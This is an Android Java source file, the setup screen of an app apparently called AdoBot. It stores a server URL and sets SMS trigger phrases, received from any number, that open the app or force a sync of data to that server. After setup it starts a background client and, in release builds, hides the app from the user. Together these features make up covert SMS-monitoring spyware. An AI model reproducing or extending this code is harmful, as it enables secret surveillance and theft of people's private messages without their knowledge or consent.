package com.android.adobot.activities;

import android.content.Context;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.adobot.BuildConfig;
import com.android.adobot.AdobotConstants;
import com.android.adobot.R;

/**
 * Created by adones on 2/26/17.
 */

public class SetupActivity extends BaseActivity {

    private static final String TAG = "SetupActivity";

    SharedPreferences prefs;
    EditText editTextUrl, forceSyncSmsEditText, smsOpenText;
    String serverUrl, openAppSmsStr, forceSyncStr;
    Button btnSetUrl;
    AppCompatActivity activity;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activity = this;
        setContentView(R.layout.activity_setup);
        prefs = this.getSharedPreferences("com.android.adobot", Context.MODE_PRIVATE);
        serverUrl = prefs.getString(AdobotConstants.PREF_SERVER_URL_FIELD, AdobotConstants.DEFAULT_SERVER_URL);
        openAppSmsStr = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
        forceSyncStr = prefs.getString(AdobotConstants.PREF_FORCE_SYNC_SMS_COMMAND_FIELD, "Baby?");

        editTextUrl = (EditText) findViewById(R.id.edit_text_server_url);
        smsOpenText = (EditText) findViewById(R.id.sms_open_text);
        forceSyncSmsEditText = (EditText) findViewById(R.id.submit_sms_command);

        editTextUrl.setText(serverUrl);
        smsOpenText.setText(openAppSmsStr);
        forceSyncSmsEditText.setText(forceSyncStr);

        TextView instruction = (TextView) findViewById(R.id.text_instruction);
        instruction.setText("Server URL");


        TextView sms_instruct = (TextView) findViewById(R.id.sms_open_text_instruction);
        sms_instruct.setText("Open App by SMS");
        TextView smsupload = (TextView) findViewById(R.id.submit_sms_instruction);
        smsupload.setText("Sync SMS Command");

        btnSetUrl = (Button) findViewById(R.id.btn_save_settings);
        btnSetUrl.setOnClickListener(saveBtnClickListener);

    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    private View.OnClickListener saveBtnClickListener = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            serverUrl = editTextUrl.getText().toString();
            openAppSmsStr = smsOpenText.getText().toString();
            forceSyncStr = forceSyncSmsEditText.getText().toString();
            String reviewText = "Confirm your server address: \n\n" + serverUrl;
            new AlertDialog.Builder(activity)
                    .setTitle("Server Setup")
                    .setMessage(reviewText)
                    .setIcon(android.R.drawable.ic_dialog_alert)
                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {

                        public void onClick(DialogInterface dialog, int whichButton) {
                            setServerUrl(serverUrl);
//                            Toast.makeText(SetupActivity.this, "AdoBot server set to: \n" + serverUrl, Toast.LENGTH_LONG).show();

                            String title = "Open app by SMS";
                            new AlertDialog.Builder(activity)
                                    .setTitle(title)
                                    .setMessage("Open Adobot by receiving \""+ openAppSmsStr +"\" from any mobile number.")
                                    .setIcon(android.R.drawable.ic_dialog_alert)
                                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {

                                        public void onClick(DialogInterface dialog, int whichButton) {
                                            setOpenAppSmsStr(openAppSmsStr);
//                                            Toast.makeText(SetupActivity.this, "Open the app by sending this SMS to any number: \n" + openAppSmsStr, Toast.LENGTH_LONG).show();

                                            String title = "Upload SMS Command";
                                            new AlertDialog.Builder(activity)
                                                    .setTitle(title)
                                                    .setMessage("Force sync to server by receiving \""+ forceSyncStr +"\" from any mobile number.")
                                                    .setIcon(android.R.drawable.ic_dialog_alert)
                                                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {

                                                        public void onClick(DialogInterface dialog, int whichButton) {
                                                            setForceSyncSmsEditText(forceSyncStr);
//                                                            Toast.makeText(SetupActivity.this, "Upload SMS's by receiving this SMS from any number: \n" + forceSyncStr, Toast.LENGTH_LONG).show();
                                                        }
                                                    })
                                                    .setNegativeButton(android.R.string.no, null).show();
                                        }
                                    })
                                    .setNegativeButton(android.R.string.no, null).show();

                        }
                    })
                    .setNegativeButton(android.R.string.no, null).show();
        }
    };

    private void setServerUrl(String url) {
        prefs.edit().putString(AdobotConstants.PREF_SERVER_URL_FIELD, url).commit();
    }

    private void setOpenAppSmsStr(String openAppSmsStr) {
        prefs.edit().putString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, openAppSmsStr.trim()).commit();
    }

    private void setForceSyncSmsEditText(String str) {
        prefs.edit().putString(AdobotConstants.PREF_FORCE_SYNC_SMS_COMMAND_FIELD, str).commit();
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            done();
            finish();
        }
    }

    private void done() {
        startClient();
        if (!BuildConfig.DEBUG){
            Toast.makeText(SetupActivity.this, "Hiding Adobot app. Please wait...", Toast.LENGTH_LONG).show();
            hideApp();
        }
    }

    @Override
    protected void onStop() {
        done();
        super.onStop();
    }
}
